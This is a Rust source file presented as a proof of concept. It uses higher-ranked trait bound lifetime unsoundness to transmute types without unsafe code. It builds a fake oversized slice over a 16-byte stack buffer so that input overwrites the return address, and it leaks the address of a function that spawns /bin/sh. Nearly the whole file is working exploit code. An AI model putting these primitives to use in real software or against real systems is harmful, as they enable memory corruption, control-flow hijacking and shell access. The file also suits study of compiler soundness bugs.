//! # Safe Rust Buffer Overflow PoC
//!
//! Demonstrates a stack buffer overflow and return address overwrite using
//! **only safe Rust** via HRTB (Higher-Ranked Trait Bounds) lifetime unsoundness.
//!
//! ## Vulnerability Chain
//! 1. HRTB unsoundness allows arbitrary lifetime extension
//! 2. Lifetime extension enables safe type transmutation
//! 3. Transmutation creates fake slice pointing to stack with inflated length
//! 4. Writing to fake slice overflows into return address
//!
//! ## Usage
//! ```bash
//! cargo build
//! python3 exploit.py
//! ```

use std::io::{self, Read, Write, stdin, stdout};

// ============================================================================
// TARGET FUNCTION
// ============================================================================

/// Win function - target for return address overwrite.
/// Spawns an interactive shell when called.
#[inline(never)]
#[allow(dead_code)]
pub fn win() {
    use std::os::unix::process::CommandExt;
    println!("[!] You Win! Spawning shell...");
    std::process::Command::new("/bin/sh").exec();
}

// ============================================================================
// EXPLOIT PRIMITIVES (HRTB Unsoundness)
// ============================================================================

/// Static reference used to anchor lifetime coercion.
const UNIT: &'static &'static () = &&();

/// Swaps lifetime 'b for lifetime 'a on a mutable reference.
/// The anchor parameter tricks the borrow checker.
#[inline(never)]
fn swap_mut<'a, 'b, T>(_anchor: &'a &'b (), x: &'b mut T) -> &'a mut T {
    x
}

/// Extends the lifetime of a mutable reference arbitrarily.
/// Exploits HRTB `for<'c>` to bypass lifetime checking.
fn extend_mut<'a, 'b, T>(x: &'a mut T) -> &'b mut T {
    let f: for<'c> fn(_, &'c mut T) -> &'b mut T = swap_mut;
    f(UNIT, x)
}

/// Transmutes type A to type B without unsafe.
/// Uses lifetime extension to access memory after type change.
fn transmute<A, B>(obj: A) -> B {
    use std::hint::black_box;

    #[allow(dead_code)]
    enum DummyEnum<A, B> {
        A(Option<Box<A>>),
        B(Option<Box<B>>),
    }

    #[inline(never)]
    fn inner<A, B>(dummy: &mut DummyEnum<A, B>, obj: A) -> B {
        let DummyEnum::B(ref_to_b) = dummy else {
            unreachable!()
        };
        // Extend lifetime beyond the enum mutation
        let ref_to_b = extend_mut(ref_to_b);
        // Change enum variant (type confusion)
        *dummy = DummyEnum::A(Some(Box::new(obj)));
        black_box(dummy);
        // Access old reference as new type
        *ref_to_b.take().unwrap()
    }

    inner(black_box(&mut DummyEnum::B(None)), obj)
}

// ============================================================================
// MEMORY CORRUPTION PRIMITIVE
// ============================================================================

/// Constructs a fake mutable slice pointing to arbitrary memory.
///
/// # Arguments
/// * `ptr` - Base pointer for the slice
/// * `len` - Fake length (can exceed actual buffer size)
///
/// # Returns
/// A mutable slice that allows writing beyond buffer bounds.
#[inline(always)]
fn construct_fake_slice(ptr: *mut u8, len: usize) -> &'static mut [u8] {
    // Slice fat pointer layout: [ptr: usize, len: usize]
    let sentinel: &mut [u8] = transmute::<_, &mut [u8]>([0usize, 1usize]);
    let mut actual = [0usize; 2];
    actual[sentinel.as_ptr() as usize] = ptr as usize;
    actual[sentinel.len()] = len;
    std::mem::forget(sentinel);
    transmute::<_, &mut [u8]>(actual)
}

// ============================================================================
// VULNERABLE FUNCTION
// ============================================================================

/// Vulnerable function with exploitable stack buffer overflow.
///
/// Stack layout (approximate):
/// ```text
/// [higher addresses]
/// ├── return address     ← overwrite target
/// ├── saved rbp
/// ├── ... padding ...
/// └── buf[16]            ← overflow starts here
/// [lower addresses]
/// ```
fn buffer_overflow() -> io::Result<()> {
    use std::hint::black_box;

    // 16-byte stack buffer
    let mut buf = black_box([0u8; 16]);

    // Create fake slice with inflated length to reach return address
    let fake_slice = construct_fake_slice(buf.as_mut_ptr(), 1024);

    print!("Input: ");
    stdout().flush()?;

    // Read directly into fake slice - no bounds checking!
    stdin().read(fake_slice)?;

    Ok(())
}

// ============================================================================
// ENTRY POINT
// ============================================================================

fn main() {
    // Leak win() address (for PIE bypass)
    println!("win() @ {:p}", win as *const ());
    println!("Enter payload to overflow return address:");

    let _ = buffer_overflow();
}
